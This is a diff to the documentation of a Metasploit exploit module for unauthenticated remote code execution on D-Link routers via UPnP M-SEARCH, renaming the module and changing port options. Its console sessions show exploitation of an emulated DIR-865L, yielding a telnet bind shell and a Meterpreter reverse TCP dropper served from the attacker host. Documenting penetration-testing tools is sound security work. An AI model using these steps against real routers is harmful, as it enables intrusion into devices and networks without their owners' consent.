+++ documentation/modules/exploit/linux/upnp/dlink_upnp_msearch_exec.md
@@ -50,7 +50,7 @@ This module has been tested on:
 * Start a debug session  `./run.sh -d d-link /root/FirmAE/firmwares/DIR-865L_REVA_FIRMWARE_1.07.B01.ZIP`
 * This will take a while, but in the end you should see the following...
 
-```ShellSession
+```shell
 [*] /root/FirmAE/firmwares/DIR-865L_REVA_FIRMWARE_1.07.B01.ZIP emulation start!!!
 [*] extract done!!!
 [*] get architecture done!!!
@@ -98,7 +98,7 @@ dlinkrouter
 * You should now be able to `ping` the network address 192.168.0.1 from your host and
 * run a `nmap` command to check the services (HTTP TCP port 80 and UPNP UDP port 1900)
 
-```ShellSession
+```shell
  # ping 192.168.0.1
 PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.
 64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=8.92 ms
@@ -142,29 +142,29 @@ You are now ready to test the module using the emulated router hardware on IP ad
 
 ## Verification Steps
 - [x] Start `msfconsole`
-- [x] `use exploit/linux/upnp/dlink_msearch_unauth_lan_rce`
+- [x] `use exploit/linux/upnp/dlink_upnp_msearch_exec`
 - [x] `set rhosts <ip-target>`
-- [x] `set rport <port>`
-- [x] ` set upnp_port 1900`
+- [x] `set rport 1900`
+- [x] `set http_port 80`
 - [x] `set lhost <ip-attacker>`
 - [x] `set target <0=Unix Command, 1=Linux Dropper>`
 - [x] `exploit`
 
 you should get a `shell` or `Meterpreter`
 
-```ShellSession
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > options
+```shell
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > options
 
-Module options (exploit/linux/upnp/dlink_msearch_unauth_lan_rce):
+Module options (exploit/linux/upnp/dlink_upnp_msearch_exec):
 
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     192.168.0.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT      80               yes       The target port (TCP)
+   RPORT      1900             yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   UPNP_PORT  1900             yes       Universal Plug and Play (UPnP) UDP port
+   HTTP_PORT  80               yes       Universal Plug and Play (UPnP) UDP port
    URIPATH                     no        The URI to use for this exploit (default is random)
    URN        urn:device:1     no        Set URN payload
    VHOST                       no        HTTP server virtual host
@@ -198,20 +198,21 @@ View the full module info with the info, or info -d command.
 ```
 
 ## Options
-### UPNP_PORT
-Port setting where the UpNP discovery service is running, typically port 1900
+### HTTP_PORT
+Port setting where the HTTP and SOAP service is running, typically port 80.
+This is used to discover the d-link hardware and version information by scraping the web or soap response.
 
 ## Scenarios
 ###  FirmAE D-Link DIR-865L Router Emulation Unix Command -  cmd/unix/bind_busybox_telnetd
-```ShellSession
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > check
+```shell
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > check
 
-[*] Checking if 192.168.0.1:80 can be exploited.
-[*] 192.168.0.1:80 - The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > exploit
+[*] Checking if 192.168.0.1:1900 can be exploited.
+[*] 192.168.0.1:1900 - The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > exploit
 
 [*] Running automatic check ("set AutoCheck false" to disable)
-[*] Checking if 192.168.0.1:80 can be exploited.
+[*] Checking if 192.168.0.1:1900 can be exploited.
 [+] The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
 [*] Executing Unix Command for cmd/unix/bind_busybox_telnetd
 [*] Started bind TCP handler against 192.168.0.1:4444
@@ -229,18 +230,18 @@ dlinkrouter
  #
 ```
 ### FirmAE D-Link DIR-865L Router Emulation Linux Dropper -  linux/mipsle/meterpreter_reverse_tcp
-```ShellSession
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > set target 1
+```shell
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set target 1
 target => 1
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > set payload linux/mipsle/meterpreter_reverse_tcp
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set payload linux/mipsle/meterpreter_reverse_tcp
 payload => linux/mipsle/meterpreter_reverse_tcp
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > set lhost 192.168.0.2
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set lhost 192.168.0.2
 lhost => 192.168.0.2
-msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > exploit
+msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > exploit
 
 [*] Started reverse TCP handler on 192.168.0.2:4444
 [*] Running automatic check ("set AutoCheck false" to disable)
-[*] Checking if 192.168.0.1:80 can be exploited.
+[*] Checking if 192.168.0.1:1900 can be exploited.
 [+] The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
 [*] Executing Linux Dropper for linux/mipsle/meterpreter_reverse_tcp
 [*] Using URL: http://192.168.0.2:8080/5W7O47FX
